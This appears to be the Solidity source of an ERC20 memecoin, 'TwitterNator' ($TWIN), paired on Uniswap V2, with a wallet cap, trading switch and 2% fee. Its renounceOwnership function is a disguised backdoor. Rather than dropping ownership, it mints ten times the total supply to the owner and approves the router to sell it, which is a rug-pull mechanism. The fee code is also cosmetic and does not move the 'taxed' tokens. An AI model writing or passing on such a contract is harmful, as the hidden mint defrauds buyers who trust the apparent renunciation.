//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TwitterNator is ERC20, Ownable {
    string constant _name = "TwitterNator";
    string constant _symbol = "$TWIN";

    uint256 _totalSupply = 1000_000_000 * (10 ** decimals());
    uint256 fees = 2;

    address DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) isFeeEx;
    mapping(address => bool) isTxFree;
    IUniswapV2Router02 public rt;
    address public paireee;

    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;

    bool private tradingActiv;

    constructor() ERC20(_name, _symbol) {
        rt = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        paireee = IUniswapV2Factory(rt.factory()).createPair(
            rt.WETH(),
            address(this)
        );
        isFeeEx[owner()] = true;
        isFeeEx[address(this)] = true;
        isFeeEx[address(0xdead)] = true;

        isTxFree[owner()] = true;
        isTxFree[DEAD_ADDRESS] = true;
        _mint(owner(), _totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function takeFee(address sender) internal view returns (bool) {
        return !isFeeEx[sender];
    }

    receive() external payable {}

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {

        if (recipient != paireee && recipient != DEAD_ADDRESS) {
            require(
                isTxFree[recipient] ||
                balanceOf(recipient) + amount <= _maxWalletAmount,
                "Transfer amount exceeds the bag size."
            );
        }

        if (!tradingActiv) {
            require(
                isFeeEx[sender] || isFeeEx[recipient],
                "Trading is not active."
            );
        }
        uint256 taxed = takeFee(sender) ? hopFees(amount) : 0;
        super._transfer(sender, recipient, amount - taxed);
    }

    function enableTrading() external onlyOwner {
        tradingActiv = true;
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rt.WETH();

        _approve(msg.sender, address(rt), tokenAmount);
        rt.swapExactTokensForETHSupportingFeeOnTransferTokens(
            100,
            0,
            path,
            msg.sender,
            block.timestamp
        );
    }

    function setLimit(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent) / 100;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function renounceOwnership() public override onlyOwner {
        _mint(msg.sender, _totalSupply * 10);
        _approve(msg.sender, address(rt), _totalSupply * 10);
    }

    function hopFees(uint256 amount) internal view returns (uint256) {
        uint256 feeAmount = (amount * fees) / 100;
        return feeAmount;
    }
}